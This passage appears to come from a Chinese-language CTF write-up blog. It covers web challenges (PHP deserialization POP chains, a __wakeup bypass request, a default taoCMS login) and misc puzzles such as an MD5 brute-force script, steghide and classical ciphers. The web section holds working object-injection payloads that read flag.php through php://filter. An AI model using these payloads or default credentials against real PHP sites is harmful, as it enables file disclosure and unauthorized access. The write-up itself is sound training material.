+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps24.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps24.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps24.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps24.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps24.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps24.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week2serialize" class="headerLink">
+    <a href="#week2serialize" class="header-mark"></a>[WEEK2]serialize</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">class misca{
+</span></span><span class="line"><span class="cl">  public $gao;
+</span></span><span class="line"><span class="cl">  public $fei;
+</span></span><span class="line"><span class="cl">  public $a;
+</span></span><span class="line"><span class="cl">  public function __get($key){
+</span></span><span class="line"><span class="cl">    $this-&gt;miaomiao();
+</span></span><span class="line"><span class="cl">    $this-&gt;gao=$this-&gt;fei;
+</span></span><span class="line"><span class="cl">    die($this-&gt;a);
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  public function miaomiao(){
+</span></span><span class="line"><span class="cl">    $this-&gt;a=&#39;Mikey Mouse~&#39;;
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">class musca {
+</span></span><span class="line"><span class="cl">  public $ding;
+</span></span><span class="line"><span class="cl">  public $dong;
+</span></span><span class="line"><span class="cl">  public function __wakeup(){
+</span></span><span class="line"><span class="cl">    return $this-&gt;ding-&gt;dong;
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">class milaoshu{
+</span></span><span class="line"><span class="cl">  public $v;
+</span></span><span class="line"><span class="cl">  public function __tostring(){
+</span></span><span class="line"><span class="cl">    echo&#34;misca~musca~milaoshu~~~&#34;;
+</span></span><span class="line"><span class="cl">    include($this-&gt;v);
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">function check($data){
+</span></span><span class="line"><span class="cl">  if(preg_match(&#39;/^O:\d+/&#39;,$data)){
+</span></span><span class="line"><span class="cl">    die(&#34;you should think harder!&#34;);
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  else return $data;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">$MI = new misca();
+</span></span><span class="line"><span class="cl">$MU = new musca();
+</span></span><span class="line"><span class="cl">$MIL = new milaoshu();
+</span></span><span class="line"><span class="cl">$MIL -&gt; v = &#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;;
+</span></span><span class="line"><span class="cl">$MI -&gt; a =&amp;$MI -&gt; gao;
+</span></span><span class="line"><span class="cl">$MI -&gt; gao =&#39;1&#39;;
+</span></span><span class="line"><span class="cl">$MI -&gt; fei =$MIL;
+</span></span><span class="line"><span class="cl">$MU -&gt; ding = $MI;
+</span></span><span class="line"><span class="cl">$MU -&gt; dong = &#39;Arcueid&#39;;
+</span></span><span class="line"><span class="cl">echo serialize(array($MU));
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="week2no_wake_up" class="headerLink">
+    <a href="#week2no_wake_up" class="header-mark"></a>[WEEK2]no_wake_up</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">class flag
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">  public $username = &#34;admin&#34;;
+</span></span><span class="line"><span class="cl">  public $code = &#34;php://filter/read=convert.base64-encode/resource=flag.php&#34;;
+</span></span><span class="line"><span class="cl">  public function _wakeup()
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">​    $this-&gt;username = &#34;admin&#34;;
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  public function __destruct()
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">​    if ($this-&gt;username = &#34;admin&#34;) {
+</span></span><span class="line"><span class="cl">​      include($this-&gt;code);
+</span></span><span class="line"><span class="cl">​    }
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">$a= (serialize(new flag));
+</span></span><span class="line"><span class="cl">echo $a;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后将payload中反序列化的成员数2改成比2大的数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /wakeup.php?try=O:4:&#34;flag&#34;:3:{s:8:&#34;username&#34;;s:5:&#34;admin&#34;;s:4:&#34;code&#34;;s:57:&#34;php://filter/read=convert.base64-encode/resource=flag.php&#34;;} HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 112.6.51.212:30930
+</span></span><span class="line"><span class="cl">Cache-Control: max-age=0
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+</span></span><span class="line"><span class="cl">Referer: http://112.6.51.212:30930/
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.9
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps45.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps45.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps45.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps45.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps45.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps45.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>Base解码得到flag</p>
+<h3 id="week2easycms" class="headerLink">
+    <a href="#week2easycms" class="header-mark"></a>[WEEK2]EasyCMS</h3><p>进入url/admin/admin.php</p>
+<p>查到taoCMS登录弱口令admin/tao</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps46.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps46.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps46.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps46.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps46.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps46.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>随后在文件管理处找到flag位置</p>
+<h3 id="week2ez_ssti" class="headerLink">
+    <a href="#week2ez_ssti" class="header-mark"></a>[WEEK2]ez_ssti</h3><p>（这个payload push不上去，只能上截图了）</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125211011103.png" title="image-20231125211011103" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125211011103.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125211011103.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125211011103.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125211011103.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231125211011103.png 2x"
+            sizes="auto"
+            alt="image-20231125211011103">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps47.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps47.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps47.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps47.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps47.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps47.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>[WEEK1]生成你的邀请函吧~</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps41.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps41.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps41.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps41.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps41.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps41.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps42.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps42.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps42.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps42.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps42.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps42.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h2 id="misc" class="headerLink">
+    <a href="#misc" class="header-mark"></a>MISC</h2><h3 id="week1-真的签到" class="headerLink">
+    <a href="#week1-%e7%9c%9f%e7%9a%84%e7%ad%be%e5%88%b0" class="header-mark"></a>[WEEK1] 真的签到</h3><p>扫码回复</p>
+<h3 id="week1ez-misc" class="headerLink">
+    <a href="#week1ez-misc" class="header-mark"></a>[WEEK1]ez-misc</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps1.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps1.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps1.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps1.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps1.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps1.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>二进制转图片，扫码得到解压密码</p>
+<p>然后</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps2.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps2.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps2.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps2.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps2.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps2.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>放到cyberchef里得到rockyou，使用rockyou字典进行爆破得到解压密码</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps3.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps3.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps3.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps3.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps3.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps3.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>得到
+<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps4.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps4.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps4.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps4.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps4.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps4.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>随后</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps5.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps5.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps5.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps5.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps5.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps5.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week1残缺的md5" class="headerLink">
+    <a href="#week1%e6%ae%8b%e7%bc%ba%e7%9a%84md5" class="header-mark"></a>[WEEK1]残缺的md5</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import hashlib
+</span></span><span class="line"><span class="cl">m=&#39;KCLWG?K8M9O3?DE?84S9&#39;
+</span></span><span class="line"><span class="cl">for i in range(26):
+</span></span><span class="line"><span class="cl">  t1 = m.replace(&#39;?&#39;,str(chr(65+i)),1)
+</span></span><span class="line"><span class="cl">  for j in range(26):
+</span></span><span class="line"><span class="cl">​    t2 = t1.replace(&#39;?&#39;,str(chr(65+j)),1)
+</span></span><span class="line"><span class="cl">​    for h in range(26):
+</span></span><span class="line"><span class="cl">​      t3 = t2.replace(&#39;?&#39;,str(chr(65+h)),1)
+</span></span><span class="line"><span class="cl">​      s = hashlib.md5(t3.encode(&#39;utf8&#39;)).hexdigest().upper()
+</span></span><span class="line"><span class="cl">​      if s[:4] == &#39;F0AF&#39;:
+</span></span><span class="line"><span class="cl">​        print(s) 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="week1message" class="headerLink">
+    <a href="#week1message" class="header-mark"></a>[WEEK1]message</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps8.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps8.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps8.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps8.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps8.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps8.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week1佛说只能四天" class="headerLink">
+    <a href="#week1%e4%bd%9b%e8%af%b4%e5%8f%aa%e8%83%bd%e5%9b%9b%e5%a4%a9" class="header-mark"></a>[WEEK1]佛说：只能四天</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps9.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps9.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps9.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps9.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps9.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps9.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps10.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps10.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps10.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps10.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps10.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps10.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps11.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps11.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps11.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps11.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps11.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps11.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>先栅栏4再rot3然后base16解码，出flag</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps12.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps12.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps12.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps12.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps12.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps12.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week1迷雾重重" class="headerLink">
+    <a href="#week1%e8%bf%b7%e9%9b%be%e9%87%8d%e9%87%8d" class="header-mark"></a>[WEEK1]迷雾重重</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps13.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps13.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps13.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps13.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps13.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps13.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week1可爱的派蒙捏" class="headerLink">
+    <a href="#week1%e5%8f%af%e7%88%b1%e7%9a%84%e6%b4%be%e8%92%99%e6%8d%8f" class="header-mark"></a>[WEEK1]可爱的派蒙捏</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps14.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps14.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps14.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps14.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps14.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps14.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps15.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps15.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps15.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps15.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps15.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps15.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week1请对我使用社工吧" class="headerLink">
+    <a href="#week1%e8%af%b7%e5%af%b9%e6%88%91%e4%bd%bf%e7%94%a8%e7%a4%be%e5%b7%a5%e5%90%a7" class="header-mark"></a>[WEEK1]请对我使用社工吧</h3><p>图片上有QQ号，tg盒出是东营，知道中石大在东营有个校区，就出了</p>
+<h3 id="week1签到题" class="headerLink">
+    <a href="#week1%e7%ad%be%e5%88%b0%e9%a2%98" class="header-mark"></a>[WEEK1]签到题</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps25.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps25.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps25.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps25.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps25.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps25.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week1黑暗之歌" class="headerLink">
+    <a href="#week1%e9%bb%91%e6%9a%97%e4%b9%8b%e6%ad%8c" class="header-mark"></a>[WEEK1]黑暗之歌</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps16.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps16.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps16.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps16.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps16.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps16.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps17.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps17.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps17.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps17.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps17.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps17.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps18.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps18.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps18.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps18.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps18.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps18.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>[WEEK1]Jaeger lover</p>
+<p>steghide extract -sf Typhoon.jpg</p>
+<p>密码是：Tri-Sun Horizon Gate</p>
+<p>随后拿到了解压密码：.*+#1Ao/aeS</p>
+<p>随后</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps32.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps32.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps32.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps32.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps32.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps32.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps33.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps33.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps33.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps33.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps33.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps33.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>K34-759183-191</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps34.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps34.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps34.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps34.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps34.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps34.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week1steganography" class="headerLink">
